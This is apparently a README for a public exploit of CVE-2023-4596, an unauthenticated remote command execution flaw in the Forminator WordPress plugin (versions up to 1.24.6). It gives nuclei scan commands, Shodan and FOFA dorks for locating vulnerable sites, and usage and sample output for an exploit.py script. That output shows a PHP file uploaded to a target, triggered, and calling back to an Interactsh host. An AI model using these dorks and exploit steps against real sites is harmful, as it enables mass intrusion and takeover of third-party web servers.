# CVE-2023-4596 
![](https://img.shields.io/static/v1?label=Product&message=Wordpress&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=Forminator%20<=%201.24.6&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%209.8.%20Unauthenticated%20Remote%20Command%20Execution&color=red)

More information see [here.](https://securityonline.info/cve-2023-4596-critical-wordpress-plugin-forminator-flaw-affects-over-400k-sites/)

[Nuclei Template](https://github.com/projectdiscovery/nuclei-templates/pull/8118/files)

```
nuclei -target <target> -t CVE-2023-4596.yaml
```
```
nuclei -target <target_file> -t CVE-2023-4596.yaml
```
- Shodan dork:
```
http.html:"/wp-content/plugins/forminator"
```
- FOFA dork:
```
body="/wp-content/plugins/forminator"
```
### Usage
Generate [Interactsh link](https://app.interactsh.com/#/)
```
python3 exploit.py -u https://target-IP/?p=7
```
```
Input interactsh link: [Input here interactsh link]
  [+] Sending payload to target
  [+] Successful file upload!

Uploaded File Location: https://target-IP/wp-content/uploads/2023/08/QotTkAFBsf.php

  [+] Sending request to uploaded file...
  [+] Successfully triggered the uploaded file!
  [+] Check Interactsh for an incoming request.
```

